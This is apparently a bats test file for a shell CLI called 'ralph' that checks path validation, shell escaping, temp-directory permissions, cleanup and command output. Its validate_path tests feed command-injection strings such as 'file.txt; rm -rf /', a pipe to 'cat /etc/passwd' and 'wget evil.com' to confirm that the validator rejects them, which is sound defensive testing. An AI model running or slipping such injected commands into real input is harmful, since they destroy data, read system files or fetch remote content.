#!/usr/bin/env bats
# test_ralph_security.bats - Security tests for ralph CLI
#
# Run with: bats tests/test_ralph_security.bats
# Install bats: brew install bats-core

# Setup - source the ralph script functions
setup() {
    # Get the directory of the test file
    TEST_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_DIR="$(dirname "$TEST_DIR")"
    RALPH_SCRIPT="$PROJECT_DIR/scripts/ralph"

    # Verify script exists
    [ -f "$RALPH_SCRIPT" ] || skip "ralph script not found at $RALPH_SCRIPT"

    # Create temp test directory
    TEST_TMPDIR=$(mktemp -d)
}

teardown() {
    # Cleanup temp directory
    [ -n "$TEST_TMPDIR" ] && rm -rf "$TEST_TMPDIR" 2>/dev/null || true
}

# ═══════════════════════════════════════════════════════════════════════════════
# validate_path() TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "validate_path blocks semicolon injection" {
    # Source validate_path function
    source "$RALPH_SCRIPT" 2>/dev/null || true

    # Create a mock log_error function
    log_error() { echo "ERROR: $1"; }

    # Test that semicolon is blocked
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path 'file.txt; rm -rf /' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks pipe injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path 'file.txt | cat /etc/passwd' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks ampersand injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path 'file.txt & wget evil.com' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks backtick injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '\`whoami\`' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks dollar sign injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '\$(whoami)' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks parentheses injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path 'file(1).txt' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks brace injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '{a,b,c}' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path blocks redirect injection" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path 'file > /tmp/out' 'nocheck' 2>&1"
    [ "$status" -eq 1 ] || [ "$output" = *"Invalid characters"* ]
}

@test "validate_path allows normal file paths" {
    # Create a test file
    touch "$TEST_TMPDIR/test_file.txt"

    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '$TEST_TMPDIR/test_file.txt' 'check' 2>&1"
    [ "$status" -eq 0 ]
}

@test "validate_path allows paths with spaces (quoted)" {
    mkdir -p "$TEST_TMPDIR/path with spaces"

    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '$TEST_TMPDIR/path with spaces' 'check' 2>&1"
    [ "$status" -eq 0 ]
}

@test "validate_path allows paths with dashes and underscores" {
    touch "$TEST_TMPDIR/my-file_name.txt"

    run bash -c "source $RALPH_SCRIPT 2>/dev/null; validate_path '$TEST_TMPDIR/my-file_name.txt' 'check' 2>&1"
    [ "$status" -eq 0 ]
}

# ═══════════════════════════════════════════════════════════════════════════════
# escape_for_shell() TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "escape_for_shell escapes single quotes" {
    source "$RALPH_SCRIPT" 2>/dev/null || true

    run bash -c "source $RALPH_SCRIPT 2>/dev/null; escape_for_shell \"it's a test\""
    [ "$status" -eq 0 ]
    # Result should be: 'it'\''s a test'
    [[ "$output" == *"'\\''"* ]] || [[ "$output" == *"it"* ]]
}

@test "escape_for_shell wraps in single quotes" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; escape_for_shell 'hello world'"
    [ "$status" -eq 0 ]
    [[ "$output" == "'"* ]] && [[ "$output" == *"'" ]]
}

@test "escape_for_shell handles empty string" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; escape_for_shell ''"
    [ "$status" -eq 0 ]
    [ "$output" = "''" ]
}

# ═══════════════════════════════════════════════════════════════════════════════
# init_tmpdir() TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "init_tmpdir creates unpredictable directory" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; init_tmpdir; echo \$RALPH_TMPDIR"
    [ "$status" -eq 0 ]
    # Should contain 10 random characters (XXXXXXXXXX pattern)
    [[ "$output" == *"ralph."* ]]
}

@test "init_tmpdir sets restrictive permissions" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; init_tmpdir; stat -f '%Lp' \$RALPH_TMPDIR 2>/dev/null || stat -c '%a' \$RALPH_TMPDIR"
    [ "$status" -eq 0 ]
    [ "$output" = "700" ]
}

@test "init_tmpdir is idempotent" {
    run bash -c "
        source $RALPH_SCRIPT 2>/dev/null
        init_tmpdir
        FIRST=\$RALPH_TMPDIR
        init_tmpdir
        SECOND=\$RALPH_TMPDIR
        [ \"\$FIRST\" = \"\$SECOND\" ] && echo 'SAME' || echo 'DIFFERENT'
    "
    [ "$output" = "SAME" ]
}

# ═══════════════════════════════════════════════════════════════════════════════
# cleanup() TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "cleanup removes temp directory" {
    run bash -c "
        source $RALPH_SCRIPT 2>/dev/null
        init_tmpdir
        TMPDIR_PATH=\$RALPH_TMPDIR
        echo 'test' > \$RALPH_TMPDIR/test.txt
        cleanup
        [ -d \"\$TMPDIR_PATH\" ] && echo 'EXISTS' || echo 'REMOVED'
    "
    [ "$output" = "REMOVED" ]
}

@test "cleanup handles already-deleted directory" {
    run bash -c "
        source $RALPH_SCRIPT 2>/dev/null
        init_tmpdir
        rm -rf \$RALPH_TMPDIR
        cleanup
        echo 'OK'
    "
    [ "$status" -eq 0 ]
    [ "$output" = "OK" ]
}

# ═══════════════════════════════════════════════════════════════════════════════
# CLI COMMAND TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "ralph help shows usage" {
    run bash "$RALPH_SCRIPT" help
    [ "$status" -eq 0 ]
    [[ "$output" == *"ralph"* ]]
    [[ "$output" == *"Multi-Agent"* ]]
}

@test "ralph version shows version number" {
    run bash "$RALPH_SCRIPT" version
    [ "$status" -eq 0 ]
    [[ "$output" == *"2.14"* ]]
}

@test "ralph unknown command exits with error" {
    run bash "$RALPH_SCRIPT" unknown-command-xyz
    [ "$status" -eq 1 ]
    [[ "$output" == *"Unknown command"* ]]
}

@test "ralph gates without hook shows error message" {
    # Temporarily move the hook if it exists
    HOOK_PATH="$HOME/.claude/hooks/quality-gates.sh"
    BACKUP_PATH="$HOME/.claude/hooks/quality-gates.sh.bak"
    [ -f "$HOOK_PATH" ] && mv "$HOOK_PATH" "$BACKUP_PATH"

    run bash "$RALPH_SCRIPT" gates

    # Restore hook
    [ -f "$BACKUP_PATH" ] && mv "$BACKUP_PATH" "$HOOK_PATH"

    [[ "$output" == *"not found"* ]] || [[ "$output" == *"Quality"* ]]
}

# ═══════════════════════════════════════════════════════════════════════════════
# ITERATION LIMIT TESTS
# ═══════════════════════════════════════════════════════════════════════════════

@test "iteration limits are correctly defined" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; echo \$CLAUDE_MAX_ITER"
    [ "$output" = "15" ]
}

@test "MiniMax iteration limit is 30" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; echo \$MINIMAX_MAX_ITER"
    [ "$output" = "30" ]
}

@test "Lightning iteration limit is 60" {
    run bash -c "source $RALPH_SCRIPT 2>/dev/null; echo \$LIGHTNING_MAX_ITER"
    [ "$output" = "60" ]
}
